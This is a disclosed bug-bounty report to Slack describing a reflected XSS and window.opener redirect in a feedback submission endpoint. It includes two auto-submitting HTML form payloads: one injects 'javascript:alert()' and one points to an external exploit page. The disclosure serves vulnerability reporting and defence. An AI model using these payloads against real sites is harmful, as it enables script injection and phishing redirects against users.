# XSS on link and window.opener 

## Report Details
- **Report ID**: 834071
- **URL**: https://hackerone.com/reports/834071
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-29T20:20:59.395Z
- **Disclosed**: 2023-01-23T14:44:05.340Z

## Reporter
- **Username**: pisarenko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Hi possible xss and error when clicking on the link .

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="javascript:alert()"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

or 

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="https://servisvk.com/exploit/opener.php"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

## Impact

Redirection from the original site to an evil site or execution of js code

Please check that the domain is `slack`

{F765317}

## Attachments
- 2.html
- 1.html
- 2020-03-29_at_23-20-26.mp4
